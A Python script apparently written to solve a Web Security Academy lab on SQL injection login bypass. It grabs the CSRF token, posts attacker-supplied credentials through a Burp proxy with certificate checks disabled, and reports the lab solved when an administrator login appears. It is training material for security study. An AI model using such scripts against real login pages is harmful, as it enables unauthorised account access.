#!/usr/bin/env python3
import re
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

LOGIN_ENDPOINT = "login"
REQUEST_TIMEOUT = (2, 5)
BURP_PROXIES = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

warnings.filterwarnings("ignore", message="Unverified HTTPS request")


def extract_csrf_token(html: str) -> Optional[str]:
    """Extract CSRF token from the login page using regex"""
    match = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return match.group(1) if match else None


def send_request(
    session: Session,
    url: str,
    params: Optional[dict] = None,
    data: Optional[dict] = None,
    proxies: Optional[dict] = None,
    method: str = "GET",
) -> Optional[Response]:
    """Helper to handles all HTTP communication"""
    headers = {"User-Agent": "Security-Scanner-v1", "Connection": ":close"}

    try:
        return session.request(
            method=method,
            url=url,
            params=params,
            data=data,
            headers=headers,
            timeout=REQUEST_TIMEOUT,
            allow_redirects=True,
            proxies=proxies,
            verify=False,
        )
    except RequestException as e:
        print(f"[-] Request failed: {e}")
        return None


def exploit_sqli(
    url: str, username: str, password: str, proxies: Optional[dict] = None
) -> bool:
    """Attempts to Login bypass via SQLi"""
    session = Session()
    login_url = urljoin(url.rstrip("/"), LOGIN_ENDPOINT)

    # Fetch login page to get the CSRF token
    res = send_request(session, login_url, proxies=proxies)
    if not res:
        print("[-] Failed to load login page!")
        return False

    # Extract CSRF token fro the login page
    csrf_token = extract_csrf_token(res.text)
    if not csrf_token:
        print("[-] CSRF token not found!")
        return False
    print(f"[*] Extracted CSRF token: {csrf_token}")

    # Make POST request with login creds
    login_data = {"csrf": csrf_token, "username": username, "password": password}

    login_res = send_request(
        session, login_url, data=login_data, proxies=proxies, method="POST"
    )

    if not login_res:
        print("[-] Login request failed!")
        return False

    return login_res is not None and "Your username is: administrator" in login_res.text


def main():
    if len(sys.argv) != 4:
        print(f"Usage {sys.argv[0]} <url> <username> <password>")
        print(
            f'Example: {sys.argv[0]} https://lab-id.web-security-academy.net "admin" "pass"'
        )
        sys.exit(1)

    url = sys.argv[1].strip()
    user = sys.argv[2].strip()
    pw = sys.argv[3].strip()

    print(f"[*] Attempting login bypass as {user}.")

    if exploit_sqli(url, user, pw, BURP_PROXIES):
        print("[!] SUCCESS: Logged in and lab solved. ")
    else:
        print("[-] SQL injection failed!")


if __name__ == "__main__":
    main()
